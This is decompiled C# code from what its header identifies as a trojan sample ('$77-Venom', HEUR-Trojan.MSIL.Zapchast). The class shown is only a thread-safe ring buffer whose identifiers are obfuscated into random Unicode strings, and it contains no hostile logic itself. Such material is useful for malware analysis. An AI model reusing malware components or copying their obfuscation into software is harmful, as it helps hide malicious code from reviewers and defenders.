// Decompiled with JetBrains decompiler
// Type: 천ꢮ⶿⬲◶撫昸ୃ࿞賃䉖䠯ꊀ쯖௨㙏녕贅鲢
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;

public class 천ꢮ\u2DBF\u2B32\u25F6撫昸ୃ\u0FDE賃䉖\uE6CA䠯ꊀ쯖௨㙏녕贅鲢
{
  private readonly byte[] 捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ;
  private readonly object 樉\uE568毱嵚儝濄\u2221䎠㰓雰삑続薪鮢\u24D9蓨奋斠ߎꗚ;
  private int 뮾赑픿ᛲ簇饒ᰧꛥ딱\uFFFD轈㚎ꬆ忀鐟ᷛ밪ࢡ霚凞;
  private int 켐薤\u0FD9ะ꾄走金얒羰羴栂䝓\uEBC9禨\uE72B靣䨫괹斗붲;
  private int ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚;

  public 천ꢮ\u2DBF\u2B32\u25F6撫昸ୃ\u0FDE賃䉖\uE6CA䠯ꊀ쯖௨㙏녕贅鲢(int size)
  {
    this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ = new byte[size];
    this.樉\uE568毱嵚儝濄\u2221䎠㰓雰삑続薪鮢\u24D9蓨奋斠ߎꗚ = new object();
  }

  public int \uFFFDሪ䴬詣簘\u0FF8㐀퍄깚ằ澽㗶噈\uE6CC覫\uE335㲷\uF235ꦶ\uE9A7(byte[] data, int offset, int count)
  {
    lock (this.樉\uE568毱嵚儝濄\u2221䎠㰓雰삑続薪鮢\u24D9蓨奋斠ߎꗚ)
    {
      int num1 = 0;
      if (count > this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ.Length - this.ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚)
        count = this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ.Length - this.ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚;
      int length = Math.Min(this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ.Length - this.뮾赑픿ᛲ簇饒ᰧꛥ딱\uFFFD轈㚎ꬆ忀鐟ᷛ밪ࢡ霚凞, count);
      Array.Copy((Array) data, offset, (Array) this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ, this.뮾赑픿ᛲ簇饒ᰧꛥ딱\uFFFD轈㚎ꬆ忀鐟ᷛ밪ࢡ霚凞, length);
      this.뮾赑픿ᛲ簇饒ᰧꛥ딱\uFFFD轈㚎ꬆ忀鐟ᷛ밪ࢡ霚凞 += length;
      this.뮾赑픿ᛲ簇饒ᰧꛥ딱\uFFFD轈㚎ꬆ忀鐟ᷛ밪ࢡ霚凞 %= this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ.Length;
      int num2 = num1 + length;
      if (num2 < count)
      {
        Array.Copy((Array) data, offset + num2, (Array) this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ, this.뮾赑픿ᛲ簇饒ᰧꛥ딱\uFFFD轈㚎ꬆ忀鐟ᷛ밪ࢡ霚凞, count - num2);
        this.뮾赑픿ᛲ簇饒ᰧꛥ딱\uFFFD轈㚎ꬆ忀鐟ᷛ밪ࢡ霚凞 += count - num2;
        num2 = count;
      }
      this.ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚 += num2;
      return num2;
    }
  }

  public int \uEC22\u2043멉䛁匇ꁬ\u2CE8牝花깻牚\uF76D输\uF1B7Ｅ㺞摕芟薦侮(byte[] data, int offset, int count)
  {
    lock (this.樉\uE568毱嵚儝濄\u2221䎠㰓雰삑続薪鮢\u24D9蓨奋斠ߎꗚ)
    {
      if (count > this.ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚)
        count = this.ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚;
      int num1 = 0;
      int length = Math.Min(this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ.Length - this.켐薤\u0FD9ะ꾄走金얒羰羴栂䝓\uEBC9禨\uE72B靣䨫괹斗붲, count);
      Array.Copy((Array) this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ, this.켐薤\u0FD9ะ꾄走金얒羰羴栂䝓\uEBC9禨\uE72B靣䨫괹斗붲, (Array) data, offset, length);
      int num2 = num1 + length;
      this.켐薤\u0FD9ะ꾄走金얒羰羴栂䝓\uEBC9禨\uE72B靣䨫괹斗붲 += length;
      this.켐薤\u0FD9ะ꾄走金얒羰羴栂䝓\uEBC9禨\uE72B靣䨫괹斗붲 %= this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ.Length;
      if (num2 < count)
      {
        Array.Copy((Array) this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ, this.켐薤\u0FD9ะ꾄走金얒羰羴栂䝓\uEBC9禨\uE72B靣䨫괹斗붲, (Array) data, offset + num2, count - num2);
        this.켐薤\u0FD9ะ꾄走金얒羰羴栂䝓\uEBC9禨\uE72B靣䨫괹斗붲 += count - num2;
        num2 = count;
      }
      this.ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚 -= num2;
      return num2;
    }
  }

  public int MaxLength => this.捀띷꽄䅋\uE0A9\u2820ྯ쏃\u0CF5鐟嚣ꡄ軚串죟\u2E84䁥힠ﶾꗄ.Length;

  public int Count
  {
    get
    {
      lock (this.樉\uE568毱嵚儝濄\u2221䎠㰓雰삑続薪鮢\u24D9蓨奋斠ߎꗚ)
        return this.ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚;
    }
  }

  public void 擲峡滞ﮇ쒒᱖兔ᦧ\uFFFDⷈ䱻咟\uF210눽驩䀅쒫腅钁\u17F2()
  {
    lock (this.樉\uE568毱嵚儝濄\u2221䎠㰓雰삑続薪鮢\u24D9蓨奋斠ߎꗚ)
      this.畷\u2EADㄽ횯裤ⅶ\uF59B鐩仹鐽퉳㭂㰖덡點釽产밢屒ₕ();
  }

  private void 畷\u2EADㄽ횯裤ⅶ\uF59B鐩仹鐽퉳㭂㰖덡點釽产밢屒ₕ()
  {
    this.ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚 = 0;
    this.켐薤\u0FD9ะ꾄走金얒羰羴栂䝓\uEBC9禨\uE72B靣䨫괹斗붲 = 0;
    this.뮾赑픿ᛲ簇饒ᰧꛥ딱\uFFFD轈㚎ꬆ忀鐟ᷛ밪ࢡ霚凞 = 0;
  }

  public void 衂ﳃܻ믁엵쁰ᴁ迤⃭\uF35Dས\uFFFD銕䝛눗侰懎蔿툢\u3301(int count)
  {
    lock (this.樉\uE568毱嵚儝濄\u2221䎠㰓雰삑続薪鮢\u24D9蓨奋斠ߎꗚ)
    {
      if (count >= this.ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚)
      {
        this.畷\u2EADㄽ횯裤ⅶ\uF59B鐩仹鐽퉳㭂㰖덡點釽产밢屒ₕ();
      }
      else
      {
        this.ῧ裧\uE8BB邿\u2004㓛\uF741ࠗ䙚챫㫷묮\u0DF7활\uF5B6沟窺ꎾ擃圚 -= count;
        this.켐薤\u0FD9ะ꾄走金얒羰羴栂䝓\uEBC9禨\uE72B靣䨫괹斗붲 += count;
        this.켐薤\u0FD9ะ꾄走金얒羰羴栂䝓\uEBC9禨\uE72B靣䨫괹斗붲 %= this.MaxLength;
      }
    }
  }
}
